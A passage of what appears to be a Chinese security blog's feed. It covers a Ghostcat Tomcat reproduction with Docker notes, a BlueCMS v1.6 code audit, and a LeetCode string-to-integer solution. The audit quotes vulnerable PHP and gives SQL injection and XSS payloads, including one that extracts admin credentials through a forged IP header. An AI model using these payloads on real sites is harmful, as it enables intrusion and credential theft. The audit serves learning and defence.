：HTTP默认端口为8080，处理http请求，而AJP默认端口8009，用于处理 AJP 协议的请求，而AJP比http更加优化，多用于反向、集群等，漏洞由于Tomcat AJP协议存在缺陷而导致，攻击者利用该漏洞可通过构造特定参数，读取服务器webapp下的任意文件以及可以包含任意文件，如果有某上传点，上传图片马等等，即可以获取shell。</p><h3 id="docker基本命令"><a href="#docker基本命令" class="headerlink" title="docker基本命令"></a>docker基本命令</h3><blockquote><p>docker run ubuntu:15.10 /bin/echo “Hello world”</p></blockquote><ul><li><strong>docker:</strong> Docker 的二进制执行文件。</li><li><strong>run:</strong> 与前面的 docker 组合来运行一个容器。</li><li><strong>ubuntu:15.10</strong> 指定要运行的镜像，Docker 首先从本地主机上查找镜像是否存在，如果不存在，Docker 就会从镜像仓库 Docker Hub 下载公共镜像。</li><li><strong>/bin/echo “Hello world”:</strong> 在启动的容器里执行的命令</li></ul><blockquote><p>docker run -i -t ubuntu:15.10 /bin/bash<br> <figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root<span class="variable">@0123ce188bd8</span><span class="symbol">:/</span><span class="comment">#</span></span><br></pre></td></tr></table></figure></p></blockquote><ul><li><strong>-t:</strong> 在新容器内指定一个伪终端或终端。</li><li><strong>-i:</strong> 允许你对容器内的标准输入 (STDIN) 进行交互。</li></ul><blockquote><p>docker run -d ubuntu:15.10 /bin/sh -c “while true; do echo hello world; sleep 1; done”<br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2</span>b<span class="number">1</span>b<span class="number">7</span>a<span class="number">428627</span><span class="keyword">c</span><span class="number">51</span>ab<span class="number">8810</span>d<span class="number">541</span>d<span class="number">759</span>f<span class="number">072</span>b<span class="number">4</span>fc<span class="number">75487</span>eed<span class="number">05812646</span>b<span class="number">8534</span>a<span class="number">2</span>fe<span class="number">63</span></span><br></pre></td></tr></table></figure></p></blockquote><p>-d参数：后台运行容器，并返回容器ID。 </p><p>可以通过docker stop停止。</p><h3 id="使用docker安装Tomcat"><a href="#使用docker安装Tomcat" class="headerlink" title="使用docker安装Tomcat"></a>使用docker安装Tomcat</h3><p><img src="https://s2.ax1x.com/2020/02/24/337thV.jpg" alt="337thV.jpg"></p><p><img src="https://s2.ax1x.com/2020/02/24/38tsl4.jpg" alt="38tsl4.jpg"></p><h3 id="启动镜像"><a href="#启动镜像" class="headerlink" title="启动镜像"></a>启动镜像</h3><p><img src="https://s2.ax1x.com/2020/02/24/38wDsg.jpg" alt="38wDsg.jpg"></p><p><img src="https://s2.ax1x.com/2020/02/24/38w6ds.jpg" alt="38w6ds.jpg"></p><p><img src="https://s2.ax1x.com/2020/02/24/38wxyD.jpg" alt="38wxyD.jpg"></p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p><img src="https://s2.ax1x.com/2020/02/24/3G2HLq.jpg" alt="3G2HLq.jpg"></p><p><img src="https://s2.ax1x.com/2020/02/24/3G2OoT.jpg" alt="3G2OoT.jpg"></p><p><img src="https://s2.ax1x.com/2020/02/24/3GRSSJ.jpg" alt="3GRSSJ.jpg"></p><p><a href="https://imgchr.com/i/3GRiex" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2020/02/24/3GRiex.jpg" alt="3GRiex.jpg"></a></p><h3 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h3><p>问题：docker拖取镜像速度及其缓慢，换成中科大的源无解</p><p>解决：修改或新增 /etc/docker/daemon.json( sudo vim /etc/docker/daemon.json )，加入如下内容</p><p>{</p><p>“registry-mirrors”: [“<a href="http://hub-mirror.c.163.com&quot;]" target="_blank" rel="noopener">http://hub-mirror.c.163.com&quot;]</a></p><p>}</p><p>systemctl restart docker.service</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Ghostcat-Tomcat-Ajp漏洞复现（CVE-2020-1938）&quot;&gt;&lt;a href=&quot;#Ghostcat-Tomcat-Ajp漏洞复现（CVE-2020-1938）&quot; class=&quot;headerlink&quot; title=&quot;Ghostcat Tomcat Ajp漏洞复现（CVE-2020-1938）&quot;&gt;&lt;/a&gt;Ghostcat Tomcat Ajp漏洞复现（CVE-2020-1938）&lt;/h2&gt;&lt;p&gt;最近的新漏洞，复现一下。&lt;/p&gt;
    
    </summary>
    
    
      <category term="渗透测试" scheme="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="CVE-2020-1938" scheme="/tags/CVE-2020-1938/"/>
    
  </entry>
  
  <entry>
    <title>BlusCMS审计</title>
    <link href="/2020/02/21/bluscms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <id>/2020/02/21/bluscms代码审计/</id>
    <published>2020-02-21T06:41:15.000Z</published>
    <updated>2020-02-21T06:41:34.706Z</updated>
    
    <content type="html"><![CDATA[<h2 id="BlueCMS审计"><a href="#BlueCMS审计" class="headerlink" title="BlueCMS审计"></a>BlueCMS审计</h2><p>一直想学代码审计，在假期废了二十天之后，决定还是稍微学一点吧，毕竟学个安全连个代码审计都不会这根本说不过去嘛……<br><a id="more"></a></p><hr><p>首先BlueCMS  v1.6 的已公开<strong>漏洞</strong>有如下</p><blockquote><ol><li><em>/uploads/ad_js.php下存在sql注入漏洞</em></li><li><em>user.php页面的存在存储型xss</em></li><li><em>文件读取1</em> </li><li><em>文件读取2</em></li><li><em>注册页面存在反射型XSS</em></li><li><em>ip地址伪造漏洞</em></li></ol></blockquote><p>使用工具：<strong><em>seay源码审计工具</em></strong></p><hr><h3 id="uploads-ad-js-php下存在sql注入漏洞"><a href="#uploads-ad-js-php下存在sql注入漏洞" class="headerlink" title="/uploads/ad_js.php下存在sql注入漏洞"></a><em>/uploads/ad_js.php下存在sql注入漏洞</em></h3><p>ad_js.php源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">define(<span class="string">'IN_BLUE'</span>, <span class="keyword">true</span>);</span><br><span class="line"><span class="keyword">require_once</span> dirname(<span class="keyword">__FILE__</span>) . <span class="string">'/include/common.inc.php'</span>;</span><br><span class="line"></span><br><span class="line">$ad_id = !<span class="keyword">empty</span>($_GET[<span class="string">'ad_id'</span>]) ? trim($_GET[<span class="string">'ad_id'</span>]) : <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($ad_id))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Error!'</span>;</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*   </span></span><br><span class="line"><span class="comment">function getone($sql, $type=MYSQL_ASSOC)&#123;</span></span><br><span class="line"><span class="comment">    $query = $this-&gt;query($sql,$this-&gt;linkid);</span></span><br><span class="line"><span class="comment">    $row = mysql_fetch_array($query, $type);</span></span><br><span class="line"><span class="comment">    return $row;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">$pre    = "blue_";</span></span><br><span class="line"><span class="comment">function table($table)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">global $pre;</span></span><br><span class="line"><span class="comment">return  $pre .$table ;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">$ad = $db-&gt;getone(<span class="string">"SELECT * FROM "</span>.table(<span class="string">'ad'</span>).<span class="string">" WHERE ad_id ="</span>.$ad_id);</span><br><span class="line"><span class="keyword">if</span>($ad[<span class="string">'time_set'</span>] == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">$ad_content = $ad[<span class="string">'content'</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>($ad[<span class="string">'end_time'</span>] &lt; time())</span><br><span class="line">&#123;</span><br><span class="line">$ad_content = $ad[<span class="string">'exp_content'</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">$ad_content = $ad[<span class="string">'content'</span>];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$ad_content = str_replace(<span class="string">'"'</span>, <span class="string">'\"'</span>,$ad_content);</span><br><span class="line">$ad_content = str_replace(<span class="string">"\r"</span>, <span class="string">"\\r"</span>,$ad_content);</span><br><span class="line">$ad_content = str_replace(<span class="string">"\n"</span>, <span class="string">"\\n"</span>,$ad_content);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;!--\r\ndocument.write(\""</span>.$ad_content.<span class="string">"\");\r\n--&gt;\r\n"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到其中比较关键的<strong><em>$ad_id</em></strong>是从GET型输入获取的，然后仅仅检测了该参数是否为空，就带入SQL语句进行查询，完全可以比如<strong><em>1 and 0 union select 1,2,3,4,5,6,7</em></strong>(假定七个字段)，就可以进行sql注入，之后是对于输出的内容进行替换，但其实根本谈不上什么防御效果。</p><h3 id="user-php页面的存在存储型xss"><a href="#user-php页面的存在存储型xss" class="headerlink" title="user.php页面的存在存储型xss"></a><em>user.php页面的存在存储型xss</em></h3><p>user.php代码有点长，截取重点的贴上来</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span>($act == <span class="string">'do_reg'</span>)&#123;</span><br><span class="line">$user_name =!<span class="keyword">empty</span>($_POST[<span class="string">'user_name'</span>]) ? trim($_POST[<span class="string">'user_name'</span>]) : <span class="string">''</span>;</span><br><span class="line">$pwd       = !<span class="keyword">empty</span>($_POST[<span class="string">'pwd'</span>]) ? trim($_POST[<span class="string">'pwd'</span>]) : <span class="string">''</span>;</span><br><span class="line">$pwd1    = !<span class="keyword">empty</span>($_POST[<span class="string">'pwd1'</span>]) ? trim($_POST[<span class="string">'pwd1'</span>]) : <span class="string">''</span>;</span><br><span class="line">$email     = !<span class="keyword">empty</span>($_POST[<span class="string">'email'</span>]) ? trim($_POST[<span class="string">'email'</span>]) : <span class="string">''</span>;</span><br><span class="line">$safecode  = !<span class="keyword">empty</span>($_POST[<span class="string">'safecode'</span>]) ? trim($_POST[<span class="string">'safecode'</span>]) : <span class="string">''</span>;</span><br><span class="line">$from = !<span class="keyword">empty</span>($from) ? base64_decode($from) : <span class="string">'user.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen($user_name) &lt; <span class="number">4</span> || strlen($user_name) &gt; <span class="number">16</span>)&#123;</span><br><span class="line">showmsg(<span class="string">'用户名字符长度不符'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(strlen($pwd) &lt; <span class="number">6</span>)&#123;</span><br><span class="line">showmsg(<span class="string">'密码不能少于6个字符'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($pwd != $pwd1)&#123;</span><br><span class="line">showmsg(<span class="string">'两次输入密码不一致'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(strtolower($safecode) != strtolower($_SESSION[<span class="string">'safecode'</span>]))&#123;</span><br><span class="line">showmsg(<span class="string">'验证码错误'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($db-&gt;getone(<span class="string">"SELECT * FROM "</span>.table(<span class="string">'user'</span>).<span class="string">" WHERE user_name='$user_name'"</span>))&#123;</span><br><span class="line">showmsg(<span class="string">'该用户名已存在'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($db-&gt;getone(<span class="string">"SELECT * FROM "</span>.table(<span class="string">'admin'</span>).<span class="string">" WHERE admin_name='$user_name'"</span>))&#123;</span><br><span class="line">showmsg(<span class="string">'该用户名已存在'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$sql = <span class="string">"INSERT INTO "</span>.table(<span class="string">'user'</span>).<span class="string">" (user_id, user_name, pwd, email, reg_time, last_login_time) VALUES ('', '$user_name', md5('$pwd'), '$email', '$timestamp', '$timestamp')"</span>;</span><br></pre></td></tr></table></figure><p>因为email并没有进行过滤，所以写一个<script>alert<code>xss</code></script>就可以进行一个存储xss</p><h3 id="文件读取1"><a href="#文件读取1" class="headerlink" title="文件读取1"></a>文件读取1</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span>($act == <span class="string">'edit'</span>)&#123;</span><br><span class="line">$file = $_GET[<span class="string">'tpl_name'</span>];</span><br><span class="line"><span class="keyword">if</span>(!$handle = @fopen(BLUE_ROOT.<span class="string">'templates/default/'</span>.$file, <span class="string">'rb'</span>))&#123;</span><br><span class="line">showmsg(<span class="string">'打开目标模板文件失败'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$tpl[<span class="string">'content'</span>] = fread($handle, filesize(BLUE_ROOT.<span class="string">'templates/default/'</span>.$file));</span><br><span class="line">$tpl[<span class="string">'content'</span>] = htmlentities($tpl[<span class="string">'content'</span>], ENT_QUOTES, GB2312);</span><br><span class="line">fclose($handle);</span><br><span class="line">$tpl[<span class="string">'name'</span>] = $file;</span><br><span class="line">template_assign(<span class="keyword">array</span>(<span class="string">'current_act'</span>, <span class="string">'tpl'</span>), <span class="keyword">array</span>(<span class="string">'编辑模板'</span>, $tpl));</span><br><span class="line">$smarty-&gt;display(<span class="string">'tpl_info.htm'</span>);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>通过GET输入获取tpl_name，直接进行文件读取，经过html实体转化后变成htm文件。</p><h3 id="文件读取2"><a href="#文件读取2" class="headerlink" title="文件读取2"></a>文件读取2</h3><p>$from变量是用户可控的，在登陆时可以通过抓包更改from变量的值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*第一处*/</span></span><br><span class="line">$from = !<span class="keyword">empty</span>($_REQUEST[<span class="string">'from'</span>]) ? $_REQUEST[<span class="string">'from'</span>] : <span class="string">''</span>;</span><br><span class="line">......</span><br><span class="line"><span class="keyword">elseif</span>($act == <span class="string">'do_login'</span>)&#123;</span><br><span class="line"> $user_name  = !<span class="keyword">empty</span>($_POST[<span class="string">'user_name'</span>]) ? trim($_POST[<span class="string">'user_name'</span>]) : <span class="string">''</span>;</span><br><span class="line"> $pwd = !<span class="keyword">empty</span>($_POST[<span class="string">'pwd'</span>]) ? trim($_POST[<span class="string">'pwd'</span>]) : <span class="string">''</span>;</span><br><span class="line"> $safecode   = !<span class="keyword">empty</span>($_POST[<span class="string">'safecode'</span>]) ? trim($_POST[<span class="string">'safecode'</span>]) : <span class="string">''</span>;</span><br><span class="line"> $useful_time=intval($_POST[<span class="string">'useful_time'</span>]);</span><br><span class="line"> $from = !<span class="keyword">empty</span>($from) ? base64_decode($from) : <span class="string">'user.php'</span>;</span><br><span class="line">......</span><br><span class="line">showmsg(<span class="string">'欢迎您 '</span>.$user_name.<span class="string">' 回来，现在将转到...'</span>, $from);</span><br></pre></td></tr></table></figure><p>可以发现$from变量控制着页面登陆后的跳转，可以把$from改成别的，这样可以实现一个任意文件读取。</p><h3 id="注册页面存在反射型XSS"><a href="#注册页面存在反射型XSS" class="headerlink" title="注册页面存在反射型XSS"></a><em>注册页面存在反射型XSS</em></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$from = !<span class="keyword">empty</span>($_REQUEST[<span class="string">'from'</span>]) ? $_REQUEST[<span class="string">'from'</span>] : <span class="string">''</span>;</span><br><span class="line">......</span><br><span class="line"><span class="keyword">elseif</span>($act == <span class="string">'reg'</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($_SESSION[<span class="string">'user_id'</span>]) &amp;&amp; $_SESSION[<span class="string">'user_id'</span>] != <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">showmsg(<span class="string">'您已经登录，请先退出登录再注册!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'last_reg'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$_SESSION[<span class="string">'last_reg'</span>] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> ($timestamp - $_SESSION[<span class="string">'last_reg'</span>] &lt; <span class="number">30</span>) </span><br><span class="line">&#123;</span><br><span class="line">showmsg(<span class="string">'为防止恶意注册，请于30秒后再来注册！'</span>);</span><br><span class="line">&#125;</span><br><span class="line">template_assign(<span class="keyword">array</span>(<span class="string">'current_act'</span>, <span class="string">'from'</span>), <span class="keyword">array</span>(<span class="string">'注册新用户'</span>, $from));</span><br><span class="line"> $smarty-&gt;display(<span class="string">'reg.htm'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此处会接收用户输入的$from值，并且不加过滤的输出html，所以会导致一个反射性xss</p><h3 id="ip地址伪造漏洞"><a href="#ip地址伪造漏洞" class="headerlink" title="ip地址伪造漏洞"></a><em>ip地址伪造漏洞</em></h3><p>由如下代码可以看出，ip可以任意被伪造</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getip</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (getenv(<span class="string">'HTTP_CLIENT_IP'</span>))</span><br><span class="line">&#123;</span><br><span class="line">$ip = getenv(<span class="string">'HTTP_CLIENT_IP'</span>); </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (getenv(<span class="string">'HTTP_X_FORWARDED_FOR'</span>)) </span><br><span class="line">&#123; <span class="comment">//获取客户端用代理服务器访问时的真实ip 地址</span></span><br><span class="line">$ip = getenv(<span class="string">'HTTP_X_FORWARDED_FOR'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (getenv(<span class="string">'HTTP_X_FORWARDED'</span>)) </span><br><span class="line">&#123; </span><br><span class="line">$ip = getenv(<span class="string">'HTTP_X_FORWARDED'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (getenv(<span class="string">'HTTP_FORWARDED_FOR'</span>))</span><br><span class="line">&#123;</span><br><span class="line">$ip = getenv(<span class="string">'HTTP_FORWARDED_FOR'</span>); </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (getenv(<span class="string">'HTTP_FORWARDED'</span>))</span><br><span class="line">&#123;</span><br><span class="line">$ip = getenv(<span class="string">'HTTP_FORWARDED'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123; </span><br><span class="line">$ip = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $ip;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*comment.php*/</span></span><br><span class="line"> $sql = <span class="string">"INSERT INTO "</span>.table(<span class="string">'comment'</span>).<span class="string">" (com_id, post_id, user_id, type, mood, content, pub_date, ip, is_check) VALUES ('', '$id', '$user_id', '$type', '$mood', '$content', '$timestamp', '"</span>.getip().<span class="string">"', '$is_check')"</span>;</span><br><span class="line"> $db-&gt;query($sql);</span><br></pre></td></tr></table></figure><p>可以看出可以通过伪造ip，让其插入数据库中，首先可以形成一个存储xss，然后既然可以随便伪造ip，而这个语句执行结果也会返回，那么可以构造payload。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*getip()=1','1'),('','6','2','1','6',(select concat(admin_name,':',pwd) from blue_admin),'1','1*/</span></span><br><span class="line">$sql = INSERT INTO <span class="string">".table('comment')."</span> (com_id, post_id, user_id, type, mood, content, pub_date, ip, is_check)</span><br><span class="line">VALUES (<span class="string">''</span>, <span class="string">'$id'</span>, <span class="string">'$user_id'</span>, <span class="string">'$type'</span>, <span class="string">'$mood'</span>, <span class="string">'$content'</span>, <span class="string">'$timestamp'</span>, <span class="string">'1'</span>,<span class="string">'1'</span>),(<span class="string">''</span>,<span class="string">'6'</span>,<span class="string">'2'</span>,<span class="string">'1'</span>,<span class="string">'6'</span>,(select concat(admin_name,<span class="string">':'</span>,pwd) from blue_admin),<span class="string">'1'</span>,<span class="string">'1'</span>, <span class="string">'$is_check'</span>)<span class="string">";</span></span><br></pre></td></tr></table></figure><p>变成了插入两条数据，第二条数据需要先去查询管理员账号密码，然后就可以舒舒服服进去后台了。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;BlueCMS审计&quot;&gt;&lt;a href=&quot;#BlueCMS审计&quot; class=&quot;headerlink&quot; title=&quot;BlueCMS审计&quot;&gt;&lt;/a&gt;BlueCMS审计&lt;/h2&gt;&lt;p&gt;一直想学代码审计，在假期废了二十天之后，决定还是稍微学一点吧，毕竟学个安全连个代码审计都不会这根本说不过去嘛……&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="渗透测试" scheme="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="BlueCMS" scheme="/tags/BlueCMS/"/>
    
      <category term="代码审计" scheme="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>字符串转换整数</title>
    <link href="/2020/01/31/%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BD%AC%E6%8D%A2%E6%95%B4%E6%95%B0/"/>
    <id>/2020/01/31/字符串转换整数/</id>
    <published>2020-01-31T13:29:24.000Z</published>
    <updated>2020-01-31T13:56:59.074Z</updated>
    
    <content type="html"><![CDATA[<h2 id="LeetCode刷题笔记"><a href="#LeetCode刷题笔记" class="headerlink" title="LeetCode刷题笔记"></a>LeetCode刷题笔记</h2><h3 id="字符串转换整数"><a href="#字符串转换整数" class="headerlink" title="字符串转换整数"></a>字符串转换整数</h3><p><strong>题目链接： <a href="https://leetcode-cn.com/problems/string-to-integer-atoi/" target="_blank" rel="noopener">https://leetcode-cn.com/problems/string-to-integer-atoi/</a> </strong></p><hr><p>​    请你来实现一个 atoi 函数，使其能将字符串转换成整数。</p><a id="more"></a><p>​    首先，该函数会根据需要丢弃无用的开头空格字符，直到寻找到第一个非空格的字符为止。</p><p>​    当我们寻找到的第一个非空字符为正或者负号时，则将该符号与之后面尽可能多的连续数字组合起来，作为该整数的正负号；假如第一个非空字符是数字，则直接将其与之后连续的数字字符组合起来，形成整数。</p><p>​    该字符串除了有效的整数部分之后也可能会存在多余的字符，这些字符可以被忽略，它们对于函数不应该造成影响。</p><p>​    注意：假如该字符串中的第一个非空格字符不是一个有效整数字符、字符串为空或字符串仅包含空白字符时，则你的函数不需要进行转换。</p><p>​    在任何情况下，若函数不能进行有效的转换时，请返回 0。</p><p>​    说明：</p><p>​    假设我们的环境只能存储 32 位大小的有符号整数，那么其数值范围为 [−231,  231 − 1]。如果数值超过这个范围，请返回  INT_MAX (231 − 1) 或 INT_MIN (−231) 。</p><blockquote><p>示例 1:</p></blockquote><p>输入: “42”<br>输出: 42</p><blockquote><p>示例 2:</p></blockquote><p>输入: “   -42”<br>输出: -42<br>解释: 第一个非空白字符为 ‘-‘, 它是一个负号。<br>     我们尽可能将负号与后面所有连续出现的数字组合起来，最后得到 -42 。</p><blockquote><p>示例 3:</p></blockquote><p>输入: “4193 with words”<br>输出: 4193<br>解释: 转换截止于数字 ‘3’ ，因为它的下一个字符不为数字。</p><blockquote><p>示例 4:</p></blockquote><p>输入: “words and 987”<br>输出: 0<br>解释: 第一个非空字符是 ‘w’, 但它不是数字或正、负号。<br>     因此无法执行有效的转换。</p><blockquote><p>示例 5:</p></blockquote><p>输入: “-91283472332”<br>输出: -2147483648<br>解释: 数字 “-91283472332” 超过 32 位有符号整数范围。<br>     因此返回 INT_MIN (−231) 。</p><hr><blockquote><p>大佬代码</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">myAtoi</span><span class="params">(self, str: str)</span> -&gt; int:</span></span><br><span class="line">        <span class="keyword">return</span> max(min(int(*re.findall(<span class="string">'^[\+\-]?\d+'</span>, str.lstrip())), <span class="number">2</span>**<span class="number">31</span> - <span class="number">1</span>), <span class="number">-2</span>**<span class="number">31</span>)</span><br></pre></td></tr></table></figure><table><thead><tr><th>提交结果</th><th>执行用时</th><th>内存消耗</th><th>语言</th></tr></thead><tbody><tr><td>通过</td><td>40 ms</td><td>13 MB</td><td>Python3</td></tr></tbody></table><p>果然N个ifelse不敌一个正则，解析一下大佬的意思</p><p>把去过左面空格的字符串传入正则，正则匹配+或-开头并且后面为数字的字符串，把字符串转换为整数，与两个边界比较。</p><hr><blockquote><p>执行速度最快的代码</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">myAtoi</span><span class="params">(self, str: str)</span> -&gt; int:</span></span><br><span class="line">        str = str.lstrip()</span><br><span class="line">        count =<span class="string">''</span></span><br><span class="line">        <span class="keyword">if</span> str == <span class="string">''</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> str[<span 